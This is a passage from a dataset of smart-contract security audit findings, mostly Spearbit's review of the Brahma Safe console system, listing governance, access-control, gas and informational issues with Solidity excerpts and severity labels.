"https://github.com/spearbit/portfolio/tree/master/pdfs/Morpho-Av3-Spearbit-Security-Review.pdf", "body": "Besides the constraint that id may not be zero, there are further constraints that are required for the insert and remove functions to work correctly:  insert: \"This function should not be called with an _id that is already in the list.\" Otherwise, it would overwrite the existing _id.  remove: \"This function should not be called with an _id that is not in the list.\" Otherwise, it would set all of _list.accounts[0] to address(0), i.e., mark the list as empty.", "labels": ["Spearbit", "Morpho-Av3", "Severity: Informational"]}, {"title": "Governance can remove policy check due to upgradability", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Governance has the possiblity to upgrade the values for several configurations. This allows circum- venting the Policy checks, due to a bug, mistake, or malicious behaviour. Combined with a lack of security or checks on other places (e.g. multisig signers, too low a threshold) funds could be lost or stolen. _getAuthorizedAddress(_TRANSACTION_VALIDATOR_HASH) _getAuthorizedAddress(_TRUSTED_VALIDATOR_HASH) _getAuthorizedAddress(_POLICY_VALIDATOR_HASH)", "labels": ["Spearbit", "Brahma", "Severity: Medium Risk"]}, {"title": "Governance can backdoor new Safes via malicious upgrade", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The SafeDeployer contract is responsible for deploying and configuring new \"top-level\" console accounts and sub-accounts. These are initialized via the authorized safe factory address with the authorized reference singleton (the implementation contract for Safe multi-signature wallets). These addresses upon which the SafeDeployer relies can be set by the governance address of the AddressProvider. Malicious governance could manipulate these addresses to have new accounts be deployed with an invalid, faulty or even backdoored safe, meaning users could start unsuspectingly using their accounts and one day unsuspect- ingly be exploited by a backdoor that governance previously installed. This could be obfuscated by making the malicious configuration part of a sandwich attack whereby deploying transactions are wrapped with 2 transactions that set and unset the malicious variants, this would prevent users from detecting this by simply querying and verifying the address configured in the AddressProvider. The likelihood for this happening is low, but if it would happen the impact for the users is high. Therefore we've set this to medium risk.", "labels": ["Spearbit", "Brahma", "Severity: Medium Risk"]}, {"title": "Changes in modules not detected", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function validatePostExecutorTransaction() checks the executor plugin is still enabled. However other modules are not checked. As modules are very powerful, it they would be \"sneaked\" in, they would pose risks to the safes. function validatePostExecutorTransaction(address, /*msgSender */ address account) external view { // ... // Check if account has executor plugin still enabled as a module on it if (!IGnosisSafe(account).isModuleEnabled(AddressProviderService._getAuthorizedAddress(_EXECUTOR_PL c UGIN_HASH))) { revert InvalidExecutorPlugin(); } // ... ,! ,! }", "labels": ["Spearbit", "Brahma", "Severity: Medium Risk"]}, {"title": "Governance can brick Safes by blocking moderator override", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The SafeModeratorOverridable contract is a guard that enables additional per-transaction valida- tion for safes via the policy validator accessed via the transaction validator. Unlike its SafeModerator counterpart, SafeModeratorOverridable is meant to be overridable allowing the safe owners to override and disable it by setting the guard back to zero. This is done by: 1. Checking if the attempted safe call is a call to setGuard(address(0)). 2. Skipping further transaction validation. The issue with this system is that the override logic is implemented in the separate TransactionValidator contract which is simply called by the safe moderator. The source of truth for the address of the transaction validator is the AddressProvider which the governance address can change. This allows a malicious governance address to effectively take all safes hostage by e.g. changing the \"authorized transaction validator\" to a contract that blocks all transactions unless a specific \"release ransom\" is paid.", "labels": ["Spearbit", "Brahma", "Severity: Medium Risk"]}, {"title": "Subaccount can be console account", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Suppose someone sets up a pseudo subaccount safe by directly calling createProxyWithNonce(), with the same parameters that would be used to create a subAccount. Then he uses this pseudo subaccount safe to call registerWallet(). This will be possible because subAccountToWallet[] hasn't been filled for this pseudo subaccount safe. Next he removes the pseudo subaccount safe via selfdestruct. After this he creates a subaccount via deploySubAccount(), which result in the same address. The result is that the subaccount is also a console account. function registerSubAccount(address _wallet, address _subAccount) external { if (msg.sender != AddressProviderService._getAuthorizedAddress(_SAFE_DEPLOYER_HASH)) revert InvalidSender(); if (subAccountToWallet[_subAccount] != address(0)) revert AlreadyRegistered(); subAccountToWallet[_subAccount] = _wallet; walletToSubAccountList[_wallet].push(_subAccount); emit RegisterSubAccount(_wallet, _subAccount); ,! } This will make other functions work in an unexected way. For example _validateMsgSenderConsoleAccount() will return true and allow a subaccount to do registerExecutor(). function _validateMsgSenderConsoleAccount(address _account) internal view { // ... // msg.sender is console account if (msg.sender == _account && _walletRegistry.isWallet(msg.sender)) return; // ... } Also updatePolicy() will allow the subaccount to update a policy. function updatePolicy(address account, bytes32 policyCommit) external { // ... } else if (msg.sender == account && walletRegistry.isWallet(account)) { // In case invoker is a registered wallet } else { revert UnauthorizedPolicyUpdate(); } // solhint-enable no-empty-blocks _updatePolicy(account, policyCommit, currentCommit); }", "labels": ["Spearbit", "Brahma", "Severity: Medium Risk"]}, {"title": "registerWallet() doesn't verify the wallet is a real Safe", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "A wallet can register itself via registerWallet(). However no check is done this wallet is actually a Safe. Also no check is done this wallet has a supperted version. As the Brahma logic uses low level details of the Safe not all versions are supported, for example the future 1.5.x versions will not automatically be supported. This could potentially leave subaccounts, that are derived from the wallet, unprotected. function registerWallet() external { if (isWallet[msg.sender]) revert AlreadyRegistered(); if (subAccountToWallet[msg.sender] != address(0)) revert IsSubAccount(); isWallet[msg.sender] = true; emit RegisterWallet(msg.sender); } Note The risk would be for the safe that registers itself. However if a user (accidentally) registers a not supported safe (very old or very new), unexpected issues could occur. The probability of the combination that a not supported safe is registired and also unrecoverable issues occur is low. However if it would happen then the impact for the safe would be high as the funds might be lost or inaccessible. Therefore we set the severity to medium.", "labels": ["Spearbit", "Brahma", "Severity: Medium Risk"]}, {"title": "Upgrade of trustedValidator could circumvent Policy checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "If the trustedValidator is a smart contract, then its called via isValidSignature. If it is a contract it could be upgraded via:  _getAuthorizedAddress(_TRUSTED_VALIDATOR_HASH).  Or, if it is deployed via a proxy, the proxy could be upgraded. If there would be a bug in the trustedValidator contract or it is maliciously upgraded then Policy checks could be circumvented. function isPolicySignatureValid(address account, bytes32 executionStructHash, bytes calldata ,! signatures) ... { return SignatureCheckerLib.isValidSignatureNow(trustedValidator, txnValidityDigest, validatorSignature); ,! } function isValidSignatureNow(address signer, bytes32 hash, bytes memory signature) ... { // ... mstore(m, f) // // ... staticcall(  bytes4(keccak256(\"isValidSignature(bytes32,bytes)\")) .    signer gas(), // Remaining gas. signer, // The m, // Offset of calldata in memory. add(returndatasize(), 0x44), // Length of calldata in memory. d, // Offset of returndata. 0x20 // Length of returndata to write. address. ) // ... }", "labels": ["Spearbit", "Brahma", "Severity: Low Risk"]}, {"title": "Console can brick its sub accounts in some scenarios if it removes itself as a module", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "If the console detaches itself as a module from its sub account that sub account will be bricked since the console is still attached to the subaccount in the wallet registry and the sub account guard has a post tx check for this requirement (the same check exists for execution plugin module): function _checkSubAccountSecurityConfig(address _subAccount) internal view { // ... address ownerConsole = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)).subAccountToWallet(_ c ,! subAccount); // Ensure owner console as a module has not been disabled if (!IGnosisSafe(_subAccount).isModuleEnabled(ownerConsole)) revert InvalidModule(); } 9 And so all submitted transaction to the sub account will be reverted with InvalidModule().", "labels": ["Spearbit", "Brahma", "Severity: Low Risk"]}, {"title": "Anyone can deploy a console with the same set of parameters but with a different _policyCommit", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Anyone can set the first _policyCommit for a console by deploying it first with the desired parameters as what the original owners of the safe want. This is due to the fact that the PolicyRegistry allows the SafeDeployer to provide non-zero _policyCommit for the console when the already stored value for this parameter is bytes32(0): function updatePolicy(address account, bytes32 policyCommit) external { // ... if ( currentCommit == bytes32(0) && msg.sender == AddressProviderService._getAuthorizedAddress(_SAFE_DEPLOYER_HASH) ) { // In case invoker is safe deployer } // ... }", "labels": ["Spearbit", "Brahma", "Severity: Low Risk"]}, {"title": "Changes between signing and execution could yield results that are outside the bounds of the policy", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "In theory things could have changed between the signing by the trusted validator and the execu- tion of the transaction. For example code that depends on a timestamp. Or a transaction that has justed executed before this one (frontrunning or sandwiching) and has influenced for the value of a token. Or a transaction which is executed via a module without updating the Safe nonce. This way the transaction could yield results that are outside the bounds of the policy. Note: as the project informed us the current polices are based on outflows of tokens, which well not be influenced by this risk:  The policy limits the amount of tokens send.  If too few tokens are available the transaction reverts. 10", "labels": ["Spearbit", "Brahma", "Severity: Low Risk"]}, {"title": "Function updatePolicy() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Accessing msg.sender is cheaper than accessing a memory variable. So if a variable is certain the to equal to msg.sender it can be replaced by msg.sender. function updatePolicy(address account, bytes32 policyCommit) external { // ... if (msg.sender == account && walletRegistry.isWallet(account)) { // ... } }", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Unnecessary custom getters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "authorizedAddresses and registries are already public storage variable so custom getter func- tions are not necessary. contract AddressProvider { mapping(bytes32 => address) public authorizedAddresses; mapping(bytes32 => address) public registries; function getAuthorizedAddress(bytes32 _key) external view returns (address) { return authorizedAddresses[_key]; } function getRegistry(bytes32 _key) external view returns (address) { return registries[_key]; } // ... 11 walletToSubAccountList is already a public storage variable so custom getter functions are not necessary. The getter function created would be of the form: /// YUL function getter_fun_walletToSubAccountList_ID(wallet, subAccountIndex) -> subAccount The function getSubAccountsForWallet() does have the added advantage that it retrieves an entire list, but this also contains the risk of an out of gas error if the list grows too long. contract WalletRegistry is AddressProviderService { mapping(address wallet => address[] subAccountList) public walletToSubAccountList; function getSubAccountsForWallet(address _wallet) external view returns (address[] memory) { return walletToSubAccountList[_wallet]; } }", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Use of storage for immutable registry addresses in AddressProvider", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The AddressProvider manages two separate key-value stores. One is the mutable authorized address store and the address the registry store (mapping(bytes32 => address) public registries). Unlike authorized addresses however the registry values in the registry store are immutable, once set they cannot be changed: _ensureAddressProvider(_registry); if (registries[_key] != address(0)) revert RegistryAlreadyExists(); registries[_key] = _registry; Note: that _ensureAddressProvider calls the _registry address and checks a return value implicitly verifying that the _registry address is not zero. This means that using storage for the AddressProvider contract have to trigger a storage read and have to do an added external call, this is an unnecessary expense considering the addresses are essentially immutable. these addresses is quite inefficient because the consumers of", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Unneeded helper contract SafeEnabler", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Currently in the SafeDeployer the initializer call for newly deployed safes is aimed at the standard multi-send, the sub-calls for which are the actual initializing calls. Some of the calls are delegate-calls to the SafeEnabler helper contract which copies the storage layout and is used to directly add modules and guards. Note In the diagram iv. H doesn't represent a function call but merely a storage update. However, a separate contract is not only not required for this but adds gas overhead because of the separate cold address access and authorized address retrieval that needs to be done for this contract. The methods contained within SafeEnabler are almost full 1:1 copies of the original Safe logic and can just be called directly. Beyond added complexity and gas inefficiency, this approach has the added downside of increasing 13 attack surface. Mimicking the storage layout of another contract is prone to subtle, difficult-to-detect errors that can have critical impacts.", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Access msg.sender within the function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Using msg.sender internally within the _setupSubAccount function rather than passing it as an argument can save gas. _subAcc = _createSafe(_owners, _setupSubAccount(_owners, _threshold, msg.sender), _salt);", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Location of _genNonce() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function _createSafe() has two instances of the call to _genNonce(). They can be combined to save some deployment gas. function _createSafe(address[] calldata _owners, bytes memory _initializer, bytes32 _salt) ... { // ... uint256 nonce = _genNonce(ownersHash, _salt); do { try ...createProxyWithNonce(...) returns (...) { _safe = ... } catch Error(string memory reason) { // ... nonce = _genNonce(ownersHash, _salt); // ... } } while (_safe == address(0)); }", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Function isPolicySignatureValid() can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function isPolicySignatureValid() uses assembly which can be replaced with Solidity. Addi- tionally the check for the code length can only be done only when necessary to save some gas. function isPolicySignatureValid(...) ... { // ... assembly { _codesize := extcodesize(trustedValidator) } if (_codesize == 0 && validatorSignature.length == 0) { revert ... } }", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Check for lacking policies can be done earlier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Suppose a console account does not have any policies. The console account allows an execu- tor to make module transactions on behalf of his console account. However, without any policies, the hook (validatePostExecutorTransaction ! _checkConsoleAccountSecurityConfig) will always revert whenever the executor tries to execute a transaction as the guard and/or fallbackHandler are not initialized. function _checkConsoleAccountSecurityConfig(address _consoleAccount) internal view { address guard = SafeHelper._getGuard(_consoleAccount); address fallbackHandler = SafeHelper._getFallbackHandler(_consoleAccount); // Ensure guard has not been disabled if (guard != AddressProviderService._getAuthorizedAddress(_SAFE_MODERATOR_OVERRIDABLE_HASH)) { revert InvalidGuard(); } // Ensure fallback handler has not been altered if (fallbackHandler != AddressProviderService._getAuthorizedAddress(_CONSOLE_FALLBACK_HANDLER_HASH)) { revert InvalidFallbackHandler(); } ,! }", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Addresses retrieved twice in executeTransaction() and validatePostExecutorTransaction()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Both the functions executeTransaction() and _validateExecutionRequest() retrieve the Trans- actionValidator address. This could be combined and the address could be supplied to _validateExecution- Request(), to save some gas. function executeTransaction(ExecutionRequest calldata execRequest) external nonReentrant returns (bytes ,! memory) { _validateExecutionRequest(execRequest); // ... TransactionValidator(AddressProviderService._getAuthorizedAddress(_TRANSACTION_VALIDATOR_HASH)) .validatePostExecutorTransaction(...); return txnResult; } function _validateExecutionRequest(ExecutionRequest calldata execRequest) internal { // ... TransactionValidator(AddressProviderService._getAuthorizedAddress(_TRANSACTION_VALIDATOR_HASH)) .validatePreExecutorTransaction(...); } 18 functions Both retrieve the WalletRegistry address. _checkSubAccountSecurityConfig(), to save some gas. validatePostExecutorTransaction() _checkSubAccountSecurityConfig() This could be combined and the address could be supplied to and function validatePostExecutorTransaction(address, /*msgSender */ address account) external view { WalletRegistry _walletRegistry = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)); ,! // ... _checkSubAccountSecurityConfig(account); // ... } function _checkSubAccountSecurityConfig(address _subAccount) internal view { // ... address ownerConsole = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)) .subAccountToWallet(_subAccount); // ... } function validatePostTransaction(bytes32, /*txHash */ bool, /*success */ address subAccount) external ,! view { _checkSubAccountSecurityConfig(subAccount); // also has to be adapted } Warning In case the value of _getAuthorizedAddress(...) would be updated as a side effect of one of the function calls the results wouldn't be identical. However shouldn't happen. Also see issue Governance can remove policy check due to upgradability.", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "keccak256 result can be cached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The current implementation redundantly recalculates keccak256(_data) on each execution. if (SafeHelper._GUARD_REMOVAL_CALLDATA_HASH == keccak256(_data)) { return true; } else if (SafeHelper._FALLBACK_REMOVAL_CALLDATA_HASH == keccak256(_data)) {", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Function updatePolicy can be optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Within function updatePolicy(), the retrieval of the walletRegistry could be moved inside the else statement, to only retrieve it when necessary. This saves some gas. function updatePolicy(address account, bytes32 policyCommit) external { ,! // ... WalletRegistry walletRegistry = WalletRegistry(AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH)); // ... if (currentCommit == bytes32(0) && msg.sender == } else if (walletRegistry.subAccountToWallet(account) == msg.sender) { } else if (msg.sender == account && walletRegistry.isWallet(account)) { } else { ... ) { revert UnauthorizedPolicyUpdate(); } // ... }", "labels": ["Spearbit", "Brahma", "Severity: Gas Optimization"]}, {"title": "Suggestions for the deployment script ConsoleFactory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": " ConsoleFactory.s.sol#L75, in 2 extra addresses are provided to create3Deploy(...) since AddressProvider's constructor only takes one argument.  ConsoleFactory.s.sol#L166, _overrideCheck is true: logic check for consoleFallbackHandler has been skipped since /// @dev skips checks for supported if (!_overrideCheck) {  addressProvider()  if  _overrideCheck is true  /// @dev skips checks for supported if (_authorizedAddress.code.length != 0) _ensureAddressProvider(_authorizedAddress); _authorizedAddress addressProvider() if is an EOA     }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Initialization of hashes in Constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The contract Constants contains several constants that are initialized via a hex string. They could also be initialized via a keccak256 expression, which would make the code easier to maintain and verify. Perhaps this is the result of previous optimizations. With optimization of the SOLC switch on this, it shouldn't make a difference. Additionally the hashes, which are determined by the Brahma protocol (and thus don't have to match a value in the Safe contracts), can be prefixed by a protocol specific path. This is to prevent that values are accidentally reused. abstract contract Constants { // ... /// @notice keccak256(\"ExecutorRegistry\") bytes32 internal constant _EXECUTOR_REGISTRY_HASH = 0x165eedff3947ccfbe9739de5f67209b9935e684faef9ce859fb3dc46d33317f1; // ... }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Enum conversion in _packMultisendTxns() not obvious", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The logic to convert from Enum Operation to Enum CallType is fragile to future changes in the enum. If any enum variants are added they'd fall through the check and cause the call variable to default 0. contract Enum { enum Operation { Call, DelegateCall } } interface Types { enum CallType { CALL, DELEGATECALL, STATICCALL } } function _packMultisendTxns(Types.Executable[] memory _txns) internal pure returns (bytes memory ,! packedTxns) { // ... uint8 call; // initially 0 and thus CALL if (_txns[i].callType == Types.CallType.DELEGATECALL) { call = uint8(Enum.Operation.DelegateCall); } else if (_txns[i].callType == Types.CallType.STATICCALL) { revert InvalidMultiSendCall(i); } // ... }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "How to recover from a bug in ExecutorPlugin", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "In case a bug is found in ExecutorPlugin it will be difficult to replace this:  All Safes would have to remove the old ExecutorPlugin from the list of modules and install a new one;  The old anymore ExecutorPlugindoesn't work rizedAddress(_EXECUTOR_PLUGIN_HASH) is updated, validatePostExecutorTransaction(), which refers to the new ExecutorPlugin. once due to the isModuleEnabled() check AddressProviderService._getAutho- in  This is good when a bug is present but  disableExecutorPluginOnSubAccount(...) can't be used anymore function enableExecutorPluginOnSubAccount(address subAccount, address[] memory executors) ... { // ... ... IGnosisSafe.enableModule, (AddressProviderService._getAuthorizedAddress(_EXECUTOR_PLUGIN_HASH)) ... // ... ,! } function disableExecutorPluginOnSubAccount(address subAccount, address previousModule) ... { // ... .. IGnosisSafe.disableModule,previousModule, AddressProviderService._getAuthorizedAddress(_EXECUTOR_PLUGIN_HASH)) ... // ... ,! } function validatePostExecutorTransaction(address, /*msgSender */ address account) external view { // ... // Check if account has executor plugin still enabled as a module on it if (!IGnosisSafe(account).isModuleEnabled(AddressProviderService._getAuthorizedAddress(_EXECUTOR_PL c UGIN_HASH))) { revert InvalidExecutorPlugin(); } // ... ,! ,! }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Re-implementation of Ownership with 2-step transfer pattern", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The AddressProvider implements the ownership with 2-step ownership transfers pattern, allowing the contract to keep track of an \"owner\" (labelled governance in AddressProvider) and only allowing transfers of said ownership via a 2-step process whereby the current owner can only \"propose\" a new owner which then has to manually accept ownership to confirm the transfer. The issue is the replication of this code. The repo already has openzeppelin-contracts as a dependency which has this exact pattern as an existing, heavily verified and audited implementation under con- tracts/access/Ownable2Step.sol. Besides the naming, they are mostly identical. The only functional difference is that the custom implementation disallows setting the pending owner to address(0) meaning that for cancelling pending transfers the owner of AddressProvider would need to use address(1). Furthermore the use of string 24 errors vs. custom errors is also a difference. However, if that is the main deciding factor a newer version of the OpenZeppelin library can be chosen that uses custom errors.", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Type hash is not aligned with ValidationParams struct", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The ValidationParams struct implemented in the codebase is as follows: struct ValidationParams { uint32 expiryEpoch; bytes32 executionStructHash; bytes32 policyHash; } However, the type hash is derived from the following ValidationParams struct, which is different from the struct used within the codebase: struct ValidationParams { uint32 expiryEpoch; ExecutionParams executionParams bytes32 policyHash; } /* * ... * @dev keccak256(\"ValidationParams(uint32 expiryEpoch,ExecutionParams executionParams,bytes32 ,! policyHash)ExecutionParams(uint8 operation,address to,address account,address executor,uint256 value,uint256 nonce,bytes data)\") ,! */ bytes32 public constant VALIDATION_PARAMS_TYPEHASH = 0x68883b91861c8baad1e8d9f6fd31a22216bb9cd1aec71362de9879112a14cde4;", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Trusted validator weakens Safe access control via ExecutorPlugin", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The PolicyValidator contract validates signatures from the \"transaction validator\" (\"validator\" herein) on messages. This is used in the safe moderator contracts (SafeModerator, SafeModeratorOverrid- able) and ExecutorPlugin contracts to validate attempted transactions externally. For the safe moderators, this simply serves as an extra check to the minimum quorum of safe signers, for the ExecutorPlugin this authenticates arbitrary, direct module transactions. Executed from the ExecutorPlugin, if configured as a module can execute anything from asset transfers to other configuration transactions (e.g. removing modules, setting guards, adjusting members etc...). This means that by colluding with the validator, a single executor can take over complete control of the safe, removing event the parent console account's ability to override. This is because the ExecutorPlugin has no on-chain limits or checks on what signatures can be executed through it, the validator is fully trusted. This means that when the ExecutorPlugin is configured as a module and executors added to a sub-account the authorization required is weakened from [sub-account signer quorum (+ optional guard)] OR [parent console account approval (+ optional guard)] to [sub-account signer quorum (+ optional guard)] OR [parent console account approval ,! OR [[ANY 1 executor] AND [validator]] (+ optional guard)]", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Use builtin functions to compute constant values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "ConsoleFallbackHandler.sol#L27, 0x1626ba7e is: UPDATED_MAGIC_VALUE = bytes4(keccak256(\"isValidSignature(bytes32,bytes)\")) Note that the original Safe implementation also does not use builtin functions. A related issue is \"Initialization of hashes in Constants\".", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Make sure the chain used to deploy the protocol implements the desired precompiles at the correct addresses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "When validating a signature the project uses Solday library to perform the check. The function used is SignatureCheckerLib.isValidSignatureNow that has the following assumption for the chain used for deployment: /// @dev Note: /// - The signature checking functions use the ecrecover precompile (0x1). /// - The /// variants use the identity precompile (0x4) to copy memory internally. bytes memory signature  ", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Best to use uint64 as a type for timestamp", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Currently the timestamps in the codebase use uint32 as a type. But the max value for this type will be reached within approximately 80 years.", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "abi.encodeCall should be used instead of abi.encodePacked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "abi.encodeCall provides type checking: It is recommended to always use abi.encodeCall even if the method has no arguments as txns[0] = Types.Executable({ callType: Types.CallType.CALL, target: AddressProviderService._getRegistry(_WALLET_REGISTRY_HASH), value: 0, data: abi.encodePacked(WalletRegistry.registerWallet.selector) // ...", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "AccountSecurityConfig checks could be expanded", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The functions _checkSubAccountSecurityConfig() and _checkConsoleAccountSecurityCon- fig() do perform some checks but these checks could be expanded for more security. the singleton hasn't been", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Misleading function names", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "1) enableExecutorPluginOnSubAccount: The SubAccount on the function name and the input pa- rameter are misleading as this function can also be called on the console account. function enableExecutorPluginOnSubAccount(address subAccount, address[] memory executors) 2) disableExecutorPluginOnSubAccount: The SubAccount on the function name and the input parameter are misleading as this function can also be called on the console account. function disableExecutorPluginOnSubAccount(address subAccount, address previousModule) 3) getExecutorsForSubAccount: The SubAccount on the function name and the input parameter are misleading as this function can also be called to query the list of executors for main console accounts. function getExecutorsForSubAccount(address _account) external view returns (address[] memory)", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Function _decompileSignatures() could revert without descriptive error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function _decompileSignatures() checks (_signatures.length < 8). However if _signa- tures.length - 8 - sigLength results in a negative value, the transaction will revert without a descriptive error. This might make troubleshooting a failed transaction more difficult. function _decompileSignatures(bytes calldata _signatures) ... { if (_signatures.length < 8) revert InvalidSignatures(); uint32 sigLength = uint32(bytes4(_signatures[_signatures.length - 8:_signatures.length - 4])); expiryEpoch = uint32(bytes4(_signatures[_signatures.length - 4:_signatures.length])); validatorSignature = _signatures[_signatures.length - 8 - sigLength:_signatures.length - 8]; }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Unused code", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "1) The _onlyGov function is not used within the codebase: function _onlyGov() internal view { if (msg.sender != addressProvider.governance()) { revert NotGovernance(msg.sender); } } 2) The following _GUARDIAN_HASH constant is not used within the codebase: bytes32 internal constant _GUARDIAN_HASH = ,! 0x424560fc12b0242dae8bb63e27dad69d2589059728e8daf9b2ff8557998f3402;", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "isValidSignature() does fewer checks than SafeModerator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function isValidSignature() does isPolicySignatureValid(), which is the equivalent of the validatePre...Transaction...() call of the SafeModerators. However there is no equivalent of the checks done in the validatePost...Transaction...() call. The function isValidSignature() doesn't allow checks after the fact, but it could to the checks from validatePost...Transaction...(). function isValidSignature(bytes memory _data, bytes memory _signature) public view override returns ,! (bytes4) { // ... if (_signature.length == 0) { require(safe.signedMessages(messageHash) != 0, \"Hash not approved\"); } else { // ... require(policyValidator.isPolicySignatureValid(msg.sender, messageHash, _signature), \"Policy ,! not approved\"); // ... } // ... }", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "Typographical errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "Several typographical errors were identified within the code comments: // SafeModeratorOverridable.sol#L14 * @notice A guard that validates transactions and allows only policy abiding txns, on Brhma console ,! account and can be overriden by removal of guard // TransactionValidator.sol#L80 * @notice Provides on-chain guarantees on security critical expected states of a Brhma console account // SafeDeployer.sol#L172 * Enable Brhma Console account as module on sub Account", "labels": ["Spearbit", "Brahma", "Severity: Informational"]}, {"title": "isValidSignature() doesn't check policy in combination with signedMessages()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Brahma-Spearbit-Security-Review.pdf", "body": "The function isValidSignature() doesn't check a policy if signedMessages() are used. The signedMessages() could be used in the following ways: 1) Delegate call to signMessage of SignMessageLib and checked via the Policy. 2) Delegate call to signMessage of SignMessageLib and via an extra installed module, outside of the knowledge of the protocol. 3) Left over from a pre-existing safe. Situation 1 is checked and should be allowed. Situation 2 and 3 are not checked by a Policy. function 